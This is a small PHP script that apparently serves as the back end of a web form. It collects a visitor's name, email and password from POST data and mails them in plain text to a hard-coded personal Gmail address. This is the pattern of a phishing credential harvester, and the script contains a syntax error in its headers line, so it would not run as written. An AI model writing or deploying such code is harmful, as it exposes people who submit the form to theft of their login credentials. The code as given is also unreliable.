<?php
$name = $_POST['name'];
$email= $_POST['email'];
$password= $_POST['password'];
$to = "19mgsuriya@gmail.com";
$subject = "Mail From website";
$txt ="Name = ". $name . "\r\n  Email = " . $email . "\r\n Password =" . $password;
$headers = "From: noreply@yoursite.com" . "\r\n" .
if($email != NULL){
    mail($to,$subject,$txt,$headers);
}
?>